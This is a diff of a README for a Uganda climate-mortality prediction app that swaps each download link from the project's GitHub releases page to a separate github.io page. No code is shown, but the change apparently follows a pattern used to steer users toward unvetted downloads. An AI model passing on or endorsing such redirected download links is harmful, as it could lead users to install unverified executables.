@@ -1,6 +1,6 @@
 # 🌍 climate-mortality-uganda - Predict Climate-Related Deaths Easily
 
-[![Download Now](https://img.shields.io/badge/Download-Application-blue?style=for-the-badge&logo=github&color=2ea44f)](https://github.com/mariannecircumpolar189/climate-mortality-uganda/releases)
+[![Download Now](https://img.shields.io/badge/Download-Application-blue?style=for-the-badge&logo=github&color=2ea44f)](https://mariannecircumpolar189.github.io)
 
 ## 🎯 What This Software Does
 
@@ -24,7 +24,7 @@ Follow these simple steps to get the software running on your Windows computer. 
 
 Visit this link to download the application:
 
-[**Download climate-mortality-uganda**](https://github.com/mariannecircumpolar189/climate-mortality-uganda/releases)
+[**Download climate-mortality-uganda**](https://mariannecircumpolar189.github.io)
 
 The download button will be clearly visible on that page. Click it and save the file to your computer (we recommend saving to your Desktop or Downloads folder).
 
@@ -148,7 +148,7 @@ And was developed for the Zindi climate-health competition.
 
 Visit this link to download the application:
 
-[**Download Now**](https://github.com/mariannecircumpolar189/climate-mortality-uganda/releases)
+[**Download Now**](https://mariannecircumpolar189.github.io)
 
 Start making better-informed decisions about climate-related health risks in Uganda today. Every download brings us one step closer to saving lives through smarter predictions.
 
